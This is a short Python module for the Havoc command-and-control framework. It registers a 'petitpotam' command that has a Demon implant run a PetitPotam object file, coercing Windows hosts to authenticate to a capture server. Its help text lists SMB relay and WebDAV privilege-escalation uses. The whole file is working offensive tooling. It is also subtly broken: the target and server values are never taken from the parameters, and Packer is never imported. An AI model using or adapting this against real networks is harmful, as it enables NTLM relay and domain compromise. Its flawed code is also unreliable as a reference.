from havoc import Demon, RegisterCommand
from struct import pack, calcsize

def petitpotam(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    packer          = Packer()
    demon           = Demon( demonID )
    num_params      = len(param)
    target          = ''
    capture_server  = ''


    if num_params != 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Only accepts two parameters [Capture Server, Target]' )
        return False

    packer.addWstr(target)
    packer.addWstr(capture_server)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to coerce with PetitPotam - USING bin/PetitPotam.{demon.ProcessArch}.o")

    demon.InlineExecute( TaskID, "go", f"bin/PetitPotam.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand(petitpotam, "", "petitpotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC", 0, "[Capture Server] [Target]", """
                    SMB Relay Attack                : petitpotam KALI DC2019
                    WebDAV LPE Attack               : petitpotam KALI@80/nop localhost
                    WebDAV LPE w/SOCKS and rportfwd : petitpotam localhost@80/nop localhost
                """)
